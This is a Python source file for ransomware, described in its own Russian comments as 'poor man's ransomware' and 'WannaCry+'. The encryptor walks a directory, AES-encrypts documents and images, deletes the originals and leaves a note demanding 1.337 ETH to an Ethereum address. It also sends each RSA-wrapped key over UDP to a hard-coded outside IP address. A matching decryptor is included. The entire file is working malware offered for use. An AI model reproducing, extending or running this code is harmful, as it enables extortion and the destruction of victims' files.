# coding=utf-8

'''
рансомwаре бедного человека
'''

import argparse
import base64
import binascii
import fnmatch
import os
import platform
import socket
import struct
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Util import Counter
from Crypto.Util.number import bytes_to_long, long_to_bytes


MAGIC = 0xBEE4FAC3

class Crypter:

	# только файлы с этими расширениями будут зашифрованы
	_PATTERNS = ("*.txt", ".doc", ".docx", "*.pdf", "*.ps",
				"*.xls", "*.xlsx", "*.ppt", "*.pptx",
				"*.odt", "*.jpg", "*.jpeg", "*.png", "*.gif")

	_MSG = """Ваши файлы были зашифрованы.
Чтобы расшифровать один файл, Вам необходимо отправить **1.337 ETH**
на Етхереум адрес:
0xC840E516167988D39FBcfF67e4E28738523eC9E3
В поле data сделку введите Ваш адрес электронной почты 
и следующий дайджест Вашего файла
{0}
Далее на этот адрес вы получите ключ дешифратор и все необходимые инструкции.
"""


	def __init__(self):
		self._count = 0
		self._rnd = Random.new()
		self._rnd_bytes = bytes_to_long(self._rnd.read(32))
		self._rsa = self._import_pk()

	def _import_pk(self):
		with open('pub.pem', 'r') as f:
			#эта криптосистема RSA
			return RSA.importKey(f.read())

	def _process_file(self, path, filename):
		key = self._gen_next_key()
		enc_key = self._send(key)
		digest = SHA256.new(enc_key).digest()
		self._write_readme(path, filename, enc_key, digest)
		self._encrypt_file(path, filename, key, digest)
		os.remove(os.path.join(path, filename))

	def _gen_next_key(self):
		#эти данные хэшируются и формуют ключ AES
		k = str(platform.uname())
		c = str(self._rnd_bytes)
		return long_to_bytes(bytes_to_long(' '.join((k, c))) + self._count)

	def _send(self, key):
		#эта отправляет зашифрованные данные на центральный сервер
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		enc_msg = base64.b64encode(self._rsa.encrypt(key, 0)[0])
		sock.sendto(enc_msg, ("35.205.64.152", 1337))
		return enc_msg

	def _write_readme(self, path, filename, enc_key, digest):
		with open(self._gen_readme_file(path, filename, digest), 'w') as readme_file:
			readme_file.write(self._MSG.format(binascii.hexlify(digest)))

  	def _gen_output_file(self, path, filename, digest):
  		return os.path.join(path, '.' + binascii.hexlify(digest)[:32] + '.шиф')

	def _gen_readme_file(self, path, filename, digest):
  		return os.path.join(path, binascii.hexlify(digest)[:32] + '.README.txt')

  	def _gen_header(self, filename):
  		magic = hex(MAGIC)[2:]
  		if magic[-1] == 'L':
  			magic = magic[:-1]
  		data = binascii.unhexlify(magic)
  		data += struct.pack('<I', len(filename))
  		data += filename

  		data += '\x00' * (AES.block_size - (len(data) % AES.block_size))

  		return data 

	def _encrypt_file(self, path, filename, key, digest):
		iv = self._rnd.read(AES.block_size)
		ctr = Counter.new(AES.block_size * 8, initial_value=long(binascii.hexlify(iv), 16))
		aes = AES.new(SHA256.new(key).digest(), mode=AES.MODE_CTR, counter=ctr)

		with open(os.path.join(path, filename), 'rb') as input_file, \
			 open(self._gen_output_file(path, filename, digest), 'wb') as output_file:
			
			output_file.write(iv)

			header = self._gen_header(filename)
			output_file.write(aes.encrypt(header))
			
			while True:
				data = input_file.read(AES.block_size)
				if len(data) == 0:
					break
				output_file.write(aes.encrypt(data))

		self._count += 1


	def process(self, path):
		for dirpath, _, filenames in os.walk(path):
			for p in self._PATTERNS:
				for filename in fnmatch.filter(filenames, p):
					self._process_file(dirpath, filename)
	

class Decrypter:

	def _decrypt_header(self, filename, input_file, key):
		iv = input_file.read(AES.block_size)

		if len(iv) < AES.block_size:
			raise Exception("Ошибка в данных {0}".format(filename))

		ctr = Counter.new(AES.block_size * 8, initial_value=long(binascii.hexlify(iv), 16))
		aes = AES.new(key, mode=AES.MODE_CTR, counter=ctr)

		data = input_file.read(AES.block_size)

		if len(data) < AES.block_size:
			raise Exception("Ошибка в данных {0}".format(filename))

		data = aes.decrypt(data)
		if long(binascii.hexlify(data[:4]), 16) != MAGIC:
			raise Exception("Ошибка в данных {0}".format(filename))

		lsize = struct.calcsize('<I')
		l = struct.unpack('<I', data[4:4 + lsize])[0]
		filename = str(data[4 + lsize:])
		filename = filename[:l]
		while len(filename) < l:
			data = input_file.read(AES.block_size)
			filename += aes.decrypt(data)
			filename = filename[:l]

		return (aes, filename)

	def _decrypt_file(self, path, filename, key):
		with open(os.path.join(path, filename), 'rb') as input_file:

			aes, output_filename = self._decrypt_header(filename, input_file, key)

			with open(os.path.join(path, output_filename), 'wb') as output_file:
				while True:
					data = input_file.read(AES.block_size)
					if len(data) == 0:
						break
					output_file.write(aes.decrypt(data))
		
		print "Файл {0} дешифрован".format(output_filename)
		os.remove(os.path.join(path, filename))

	def process(self, path, digest_key_list):
		lookup = dict(digest_key_list)
		lookup.update(dict((digest[:32], key) for digest, key in digest_key_list))
		for dirpath, _, filenames in os.walk(path):
			for filename in filenames:
				try:
					key = lookup[filename[1:-7]] # пропусти расширение файла .шиф
					self._decrypt_file(dirpath, filename, base64.b64decode(key))
				except KeyError:
					continue

if __name__ == '__main__':

	parser = argparse.ArgumentParser(description='WаннаЦрy+ - отличный вирус-шифровальщик')
	parser.add_argument('--path', dest='path', nargs='?', const=os.getcwd(), default=os.getcwd(),
		help='каталог')
	parser.add_argument('-d', dest='decrypt', action='store_true',
		help='расшифровкa файлов')
	parser.add_argument('args', nargs='*',
		help='пара: дайджест (имя зашифрованного файла) и ключ дешифратор')

	args = parser.parse_args()
	if args.decrypt:
		decrypter = Decrypter()
		if len(args.args) % 2 != 0:
			raise Exception("Неверное число аргументов")
		decrypter.process(args.path, zip(args.args[::2], args.args[1::2]))
	else:
		crypter = Crypter()
		crypter.process(args.path)
